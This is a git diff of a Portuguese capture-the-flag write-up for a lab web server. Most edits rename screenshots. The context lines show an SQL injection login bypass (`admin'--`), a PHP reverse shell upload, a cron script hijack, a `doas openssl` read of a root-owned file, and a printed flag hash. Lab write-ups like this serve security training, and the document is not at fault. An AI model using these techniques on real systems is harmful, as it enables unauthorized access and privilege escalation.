@@ -22,7 +22,7 @@ Foram identificadas três portas abertas: **22 (SSH)**, **80 (HTTP)** e **445** 
 
 Com as portas em mãos, executei um scan com detecção de versão (`-sV`) e scripts padrão (`-sC`) para confirmar os serviços:
 
-[![Nmap Detalhado](img/nmap_detalhado.png)](img/nmap_detalhado.png)
+[![Nmap Detalhado](img/nmap_nas_portas_achadas.png)](img/nmap_nas_portas_achadas.png)
 
 | Porta | Serviço | Versão |
 |-------|---------|--------|
@@ -48,7 +48,7 @@ Rodei o Gobuster com a wordlist `common.txt` para mapear os diretórios:
 gobuster dir -u http://10.66.184.54/ -w /usr/share/dirb/wordlists/common.txt
 ```
 
-[![Gobuster Porta 80](img/gobuster_porta80.png)](img/gobuster_porta80.png)
+[![Gobuster Porta 80](img/gobuster_inicial.png)](img/gobuster_inicial.png)
 
 Os endpoints mais interessantes foram `/admin`, `/passwd` e `/shadow` — todos acessíveis sem autenticação.
 
@@ -60,7 +60,7 @@ O directory listing estava habilitado, expondo um arquivo `id_rsa`:
 
 O conteúdo do arquivo era uma string em Base64:
 
-[![Conteúdo id_rsa](img/conteudo_id_rsa.png)](img/conteudo_id_rsa.png)
+[![Conteúdo id_rsa](img/conteudo_diretorio_id_rsa.png)](img/conteudo_diretorio_id_rsa.png)
 
 ### Análise do endpoint /passwd
 
@@ -74,11 +74,11 @@ O endpoint `//passwd` também retornava uma string em Base64:
 
 Ao decodificar ambos os artefatos, os resultados foram mensagens propositalmente enganosas:
 
-[![Decode id_rsa](img/decode_id_rsa.png)](img/decode_id_rsa.png)
+[![Decode id_rsa](img/decode_texto_id_rsa.png)](img/decode_texto_id_rsa.png)
 
 > *"Trust me it is not this easy.. now get back to enumeration :D"*
 
-[![Decode passwd](img/decode_passwd.png)](img/decode_passwd.png)
+[![Decode passwd](img/decode_texto_passwd.png)](img/decode_texto_passwd.png)
 
 > *"not this easy :D"*
 
@@ -92,7 +92,7 @@ Ambos os arquivos eram **rabbit holes** — armadilhas intencionais para desviar
 
 A porta 445 também respondia com a página padrão do Apache2:
 
-[![Apache Porta 445](img/apache_445.png)](img/apache_445.png)
+[![Apache Porta 445](img/pagina_porta_445.png)](img/pagina_porta_445.png)
 
 ### Gobuster — Porta 445
 
@@ -100,7 +100,7 @@ A porta 445 também respondia com a página padrão do Apache2:
 gobuster dir -u http://10.66.184.54:445/ -w /usr/share/dirb/wordlists/common.txt
 ```
 
-[![Gobuster Porta 445](img/gobuster_porta445.png)](img/gobuster_porta445.png)
+[![Gobuster Porta 445](img/gobuster_apache_da_porta_445.png)](img/gobuster_apache_da_porta_445.png)
 
 Foi encontrado o diretório `/management`, que levava à aplicação real da máquina.
 
@@ -108,7 +108,7 @@ Foi encontrado o diretório `/management`, que levava à aplicação real da má
 
 Acessando `/management/`, foi revelada a aplicação-alvo:
 
-[![TMS Página Principal](img/tms_pagina.png)](img/tms_pagina.png)
+[![TMS Página Principal](img/diretorio_management.png)](img/diretorio_management.png)
 
 ### Gobuster dentro de /management/
 
@@ -118,7 +118,7 @@ Uma segunda rodada de enumeração mapeou toda a estrutura interna da aplicaçã
 gobuster dir -u http://10.66.184.54:445/management -w /usr/share/dirb/wordlists/common.txt
 ```
 
-[![Gobuster Management](img/gobuster_management.png)](img/gobuster_management.png)
+[![Gobuster Management](img/gobuster_no_diretorio_management.png)](img/gobuster_no_diretorio_management.png)
 
 Entre os diretórios encontrados, o `/database/` e o `/uploads/` chamaram atenção imediata.
 
@@ -130,13 +130,13 @@ Entre os diretórios encontrados, o `/database/` e o `/uploads/` chamaram atenç
 
 O directory listing estava habilitado, expondo um arquivo `traffic_offense_db.sql` de 10KB completamente acessível sem autenticação:
 
-[![Diretório /database](img/diretorio_database.png)](img/diretorio_database.png)
+[![Diretório /database](img/diretorio_db_sql.png)](img/diretorio_db_sql.png)
 
 ### Conteúdo do dump SQL
 
 O arquivo continha a estrutura completa do banco de dados, incluindo a tabela `users` com hashes de senha:
 
-[![Conteúdo SQL](img/conteudo_sql.png)](img/conteudo_sql.png)
+[![Conteúdo SQL](img/conteudo_db_sql.png)](img/conteudo_db_sql.png)
 
 Credenciais extraídas do dump:
 
@@ -155,8 +155,7 @@ Credenciais extraídas do dump:
 
 Com os hashes extraídos, utilizei o John the Ripper com a wordlist `rockyou.txt`:
 
-[![John nos Hashes](img/john_hashes.png)](img/john_hashes.png)
-[![John jsmith](img/john_jsmith.png)](img/john_jsmith.png)
+[![John nos Hashes](img/john_na_hash_do_jsmith.png)](img/john_na_hash_do_jsmith.png)
 
 Ambos os hashes foram quebrados em menos de 1 segundo:
 
@@ -171,11 +170,11 @@ Apesar das senhas terem sido recuperadas, **nenhuma delas funcionou no login da 
 
 Com as credenciais inválidas, testei SQL Injection diretamente no campo de usuário do painel de administração (`/management/admin/login.php`):
 
-[![Login Admin](img/login_admin.png)](img/login_admin.png)
+[![Login Admin](img/pagina_admin_redirect_pra_login_php.png)](img/pagina_admin_redirect_pra_login_php.png)
 
 O payload `admin'--` foi inserido no campo de username com a senha em branco:
 
-[![SQLi Bypass](img/sqli_bypass.png)](img/sqli_bypass.png)
+[![SQLi Bypass](img/tentativa_bem_sucedida_de_sqli_para_bypass.png)](img/tentativa_bem_sucedida_de_sqli_para_bypass.png)
 
 O login foi realizado com sucesso, confirmando que a aplicação não sanitizava o input. A query vulnerável:
 
@@ -194,21 +193,21 @@ SELECT * FROM users WHERE username = 'admin'--' AND password = ''
 
 Com o bypass bem-sucedido, o painel administrativo completo foi acessado como **Administrator Admin**:
 
-[![Painel Admin](img/painel_admin.png)](img/painel_admin.png)
+[![Painel Admin](img/painel_administrativo_da_pagina.png)](img/painel_administrativo_da_pagina.png)
 
 ### 6.4 Unrestricted File Upload — Reverse Shell
 
 Na seção **Settings** do painel, os campos de upload de imagem não realizavam nenhuma validação de tipo de arquivo. Fiz o upload de uma PHP reverse shell renomeada como `testeee.php`:
 
-[![Upload Shell](img/upload_shell.png)](img/upload_shell.png)
+[![Upload Shell](img/subindo_shell_por_upload.png)](img/subindo_shell_por_upload.png)
 
 Com um listener Netcat ativo na porta 4444, acessei o arquivo pelo browser em `/management/uploads/testeee.php`:
 
-[![Acessando Shell](img/acessando_shell.png)](img/acessando_shell.png)
+[![Acessando Shell](img/acessando_a_shell_na_pagina.png)](img/acessando_a_shell_na_pagina.png)
 
 A conexão reversa foi recebida com sucesso:
 
-[![Shell www-data](img/shell_wwwdata.png)](img/shell_wwwdata.png)
+[![Shell www-data](img/shell_obtida_por_upload.png)](img/shell_obtida_por_upload.png)
 
 Acesso inicial obtido como **`www-data`**.
 
@@ -222,15 +221,15 @@ Acesso inicial obtido como **`www-data`**.
 
 Com a shell ativa, tentei ler a user flag mas o acesso foi negado:
 
-[![Sem Acesso Flag](img/sem_acesso_flag.png)](img/sem_acesso_flag.png)
+[![Sem Acesso Flag](img/ainda_sem_acesso_da_flag_user.png)](img/ainda_sem_acesso_da_flag_user.png)
 
 Rodei um `find` para identificar binários com SUID, onde o `/usr/bin/doas` apareceu como item de interesse:
 
-[![Find SUID](img/find_suid.png)](img/find_suid.png)
+[![Find SUID](img/encontrando_doas_com_find_suid.png)](img/encontrando_doas_com_find_suid.png)
 
-Também li o `/etc/crontab` e encontrei uma tarefa executada a cada minuto pelo usuário `plot_admin`:
+Também li o `/etc/crontab` e encontrei uma tarefa executada a cada minuto pelo usuário `plot_admin`, além da configuração do `doas`:
 
-[![Crontab e doas.conf](img/crontab_doas.png)](img/crontab_doas.png)
+[![Crontab e doas.conf](img/conf_do_doas.png)](img/conf_do_doas.png)
 
 ```
 * * * * *   plot_admin   /var/www/scripts/backup.sh
@@ -240,7 +239,7 @@ Também li o `/etc/crontab` e encontrei uma tarefa executada a cada minuto pelo 
 
 Verifiquei as permissões do script e confirmei que o `www-data` tinha permissão de escrita:
 
-[![Permissão no Script](img/permissao_script.png)](img/permissao_script.png)
+[![Permissão no Script](img/permissao_total_no_diretorio_do_script.png)](img/permissao_total_no_diretorio_do_script.png)
 
 ```
 -rwxrwxr-- 1 plot_admin plot_admin 141 Oct 28 2021 /var/www/scripts/backup.sh
@@ -248,7 +247,7 @@ Verifiquei as permissões do script e confirmei que o `www-data` tinha permissã
 
 Substituí o conteúdo do script por uma reverse shell:
 
-[![Script Hijack](img/script_hijack.png)](img/script_hijack.png)
+[![Script Hijack](img/apaguei_o_script_e_criei_um_meu_para_obter_shell.png)](img/apaguei_o_script_e_criei_um_meu_para_obter_shell.png)
 
 ```bash
 rm -f /var/www/scripts/backup.sh
@@ -259,7 +258,7 @@ chmod +x /var/www/scripts/backup.sh
 
 Após no máximo 1 minuto, o cron executou o script e a conexão foi recebida como `plot_admin`:
 
-[![Shell plot_admin](img/shell_plotadmin.png)](img/shell_plotadmin.png)
+[![Shell plot_admin](img/shell_no_plot_admin_concluida.png)](img/shell_no_plot_admin_concluida.png)
 
 ### 7.3 User Flag
 
@@ -287,7 +286,7 @@ O `openssl` está catalogado no **GTFOBins** como vetor de leitura arbitrária d
 doas openssl enc -in /root/root.txt
 ```
 
-[![Flag Root](img/flag_root.png)](img/flag_root.png)
+[![Flag Root](img/flag_root_com_doas.png)](img/flag_root_com_doas.png)
 
 ```
 53f85e2da3e874426fa059040a9bdcab
@@ -319,19 +318,6 @@ Nmap → Gobuster (porta 445) → /management/ (TMS)
                                 └─ doas + openssl (GTFOBins)
                                      └─ Root Flag ✅
 ```
-
----
-
-## 🛠️ Ferramentas Utilizadas
-
-| Ferramenta | Uso |
-|------------|-----|
-| Nmap | Varredura de portas e serviços |
-| Gobuster | Enumeração de diretórios web |
-| John the Ripper | Quebra de hashes MD5 |
-| Netcat | Listener para reverse shells |
-| PHP Reverse Shell | Webshell para acesso inicial |
-| doas + openssl | Leitura de arquivo root via GTFOBins |
 
 ---
 
@@ -380,7 +366,7 @@ Os campos de upload na área de Settings não validavam o tipo do arquivo no ser
 ---
 
 **🔴 CWE-732 — Permissões Incorretas em Script de Cron**
-O script `/var/www/scripts/backup.sh`, executado a cada minuto pelo usuário `plot_admin`, possuía permissão de escrita para outros usuários (`rwxrwxr--`), permitindo que `www-data` substituísse seu conteúdo por uma reverse shell.
+O script `/var/www/scripts/backup.sh`, executado a cada minuto pelo usuário `plot_admin`, possuía permissão de escrita para outros usuários (`rwxrwx`), permitindo que `www-data` substituísse seu conteúdo por uma reverse shell.
 **Correção:** Restringir permissões do script para `rwx------` (somente o dono). Auditar regularmente tarefas cron e seus recursos associados.
 
 ---
@@ -404,4 +390,4 @@ A regra `permit nopass plot_admin as root cmd openssl` no `/etc/doas.conf` permi
 
 ---
 
-📝 **Documentação criada por Lucas Arruda**
+📝 **Documentação criada por twix**
